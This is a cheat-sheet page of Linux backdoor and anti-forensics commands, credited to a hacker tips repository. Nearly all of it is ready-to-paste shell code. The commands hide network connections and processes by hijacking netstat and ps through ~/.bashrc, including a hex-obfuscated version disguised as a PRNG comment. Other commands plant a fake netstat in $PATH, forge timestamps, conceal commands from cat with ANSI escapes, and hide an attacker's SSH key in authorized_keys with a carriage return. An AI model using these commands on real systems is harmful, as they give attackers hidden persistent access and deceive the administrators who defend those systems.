# Backdoor Linux Commands

* Credit: [https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)

### **Hide a Network Connection**

The trick is to hijack `netstat` and use grep to filter out our connection. This example filters any connection on port 31337 _or_ ip 1.2.3.4. The same should be done for `ss` (a netstat alternative).

**Method 1 - Hiding a connection with bash-function in \~/.bashrc**

Cut & paste this to add the line to \~/.bashrc

```
echo 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }' >>~/.bashrc \
&& touch -r /etc/passwd ~/.bashrc
```

Or cut & paste this for an obfuscated entry to \~/.bashrc:

```
X='netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }'
echo "eval \$(echo $(echo "$X" | xxd -ps -c1024)|xxd -r -ps) #Initialize PRNG" >>~/.bashrc \
&& touch -r /etc/passwd ~/.bashrc
```

The obfuscated entry to \~/.bashrc will look like this:

```
eval $(echo 6e65747374617428297b20636f6d6d616e64206e6574737461742022244022207c2067726570202d4676202d65203a3331333337202d6520312e322e332e343b207d0a|xxd -r -ps) #Initialize PRNG
```

### **Method 2 - Hiding a connection with a binary in $PATH**

Create a fake netstat binary in /usr/local/sbin. On a default Debian (and most Linux) the PATH variables (`echo $PATH`) lists /usr/local/sbin _before_ /usr/bin. This means that our hijacking binary /usr/local/sbin/netstat will be executed instead of /usr/bin/netstat.

```
echo -e "#! /bin/bash
exec /usr/bin/netstat \"\$@\" | grep -Fv -e :22 -e 1.2.3.4" >/usr/local/sbin/netstat \
&& chmod 755 /usr/local/sbin/netstat \
&& touch -r /usr/bin/netstat /usr/local/sbin/netstat
```

_(thank you iamaskid)_

### **Hide a process as user**

Continuing from "Hiding a connection" the same technique can be used to hide a process. This example hides the nmap process and also takes care that our `grep` does not show up in the process list by renaming it to GREP:

```
echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >>~/.bashrc \
&& touch -r /etc/passwd ~/.bashrc
```

### **Hide from cat**

ANSI escape characters or a simple  ([carriage return](https://www.hahwul.com/2019/01/23/php-hidden-webshell-with-carriage/)) can be used to hide from `cat` and others.

Hide the last command (example: `id`) in `~/.bashrc`:

```
echo -e "id #\\033[2K\\033[1A" >>~/.bashrc
### The ANSI escape sequence \\033[2K erases the line. The next sequence \\033[1A
### moves the cursor 1 line up.
### The '#' after the command 'id' is a comment and is needed so that bash still
### executes the 'id' but ignores the two ANSI escape sequences.
```

Note: We use `echo -e` to convert `\\033` to the ANSI escape character (hex 0x1b).

Adding a  (carriage return) goes a long way to hide your ssh key from `cat`:

```
echo "ssh-ed25519 AAAAOurPublicKeyHere....blah x@y"$'\r'"$(<authorized_keys)" >authorized_keys
### This adds our key as the first key and 'cat authorized_keys' won't show
### it. The $'\r' is a bash special to create a \r (carriage return).
```
